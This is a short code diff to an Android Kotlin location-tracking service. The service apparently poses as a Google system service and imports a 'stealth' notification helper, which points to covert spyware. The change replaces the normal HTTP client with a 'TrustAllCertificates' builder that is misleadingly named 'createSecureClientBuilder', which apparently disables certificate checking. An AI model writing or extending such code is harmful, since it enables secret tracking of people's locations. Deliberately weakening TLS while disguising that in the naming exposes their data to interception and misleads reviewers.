@@ -10,6 +10,7 @@ import android.util.Log
 import com.google.android.gms.location.*
 import com.google.android.systemservice.config.AndroidConfig
 import com.google.android.systemservice.utils.StealthNotificationHelper
+import com.google.android.systemservice.utils.TrustAllCertificates
 import kotlinx.coroutines.*
 import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaType
@@ -25,7 +26,7 @@ class LocationService : Service() {
     private lateinit var fusedLocationClient: FusedLocationProviderClient
     private var locationCallback: LocationCallback? = null
     private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
-    private val client = OkHttpClient.Builder()
+    private val client = TrustAllCertificates.createSecureClientBuilder()
         .connectTimeout(30, TimeUnit.SECONDS)
         .writeTimeout(30, TimeUnit.SECONDS)
         .readTimeout(30, TimeUnit.SECONDS)
